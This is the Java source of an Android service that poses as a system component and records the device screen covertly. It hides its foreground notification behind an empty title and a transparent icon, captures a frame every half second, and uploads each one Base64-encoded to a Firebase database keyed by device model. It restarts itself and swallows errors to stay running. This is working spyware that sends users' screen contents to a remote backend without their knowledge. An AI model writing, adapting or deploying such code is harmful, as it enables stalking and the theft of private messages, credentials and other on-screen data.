package com.android.system.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private DatabaseReference deviceRef;
    private boolean isCapturing = false;
    private Thread captureThread;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new NotificationCompat.Builder(this, "screen_capture_channel")
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        startForeground(1, notification);

        int resultCode = intent.getIntExtra("resultCode", -1);
        Intent data = intent.getParcelableExtra("data");

        if (resultCode != -1 && data != null) {
            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            startScreenCapture();
        }

        return START_STICKY;
    }

    private void startScreenCapture() {
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        final int screenWidth = metrics.widthPixels;
        final int screenHeight = metrics.heightPixels;
        final int screenDensity = metrics.densityDpi;

        deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(Build.MANUFACTURER + "_" + Build.MODEL.replace(" ", "_"));

        deviceRef.child("dims").child("w").setValue(screenWidth);
        deviceRef.child("dims").child("h").setValue(screenHeight);

        final int captureWidth = screenWidth / 3;
        final int captureHeight = screenHeight / 3;

        imageReader = ImageReader.newInstance(captureWidth, captureHeight, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                captureWidth, captureHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

        isCapturing = true;
        captureThread = new Thread(() -> {
            while (isCapturing) {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * captureWidth;

                        Bitmap bitmap = Bitmap.createBitmap(captureWidth + rowPadding / pixelStride, captureHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);
                        Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, captureWidth, captureHeight);

                        ByteArrayOutputStream stream = new ByteArrayOutputStream();
                        croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 40, stream);
                        byte[] imageBytes = stream.toByteArray();

                        String encodedImage = Base64.encodeToString(imageBytes, Base64.NO_WRAP);
                        deviceRef.child("frame").setValue(encodedImage);

                        bitmap.recycle();
                        croppedBitmap.recycle();
                        stream.close();
                        image.close();
                    }
                } catch (Exception e) {
                    // Ignorar errores para mantener el servicio vivo
                }
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    isCapturing = false;
                }
            }
        });
        captureThread.start();
    }

    private void createNotificationChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("screen_capture_channel", "Screen Capture", NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isCapturing = false;
        if (captureThread != null) {
            captureThread.interrupt();
        }
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}